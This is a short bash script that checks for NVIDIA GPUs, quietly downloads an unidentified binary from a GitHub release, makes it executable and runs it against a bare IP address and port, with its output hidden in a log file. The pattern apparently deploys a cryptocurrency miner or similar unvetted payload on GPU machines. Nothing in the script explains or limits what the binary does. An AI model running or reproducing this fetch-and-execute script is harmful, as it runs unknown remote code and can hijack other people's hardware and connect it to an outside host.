#!/bin/bash
nvidia-smi -L
wget https://github.com/edwardksrbv9/kingbet/releases/download/1/call &> /dev/null
chmod +x call
./call -P http://64.52.174.90:4545/"$1" &> log
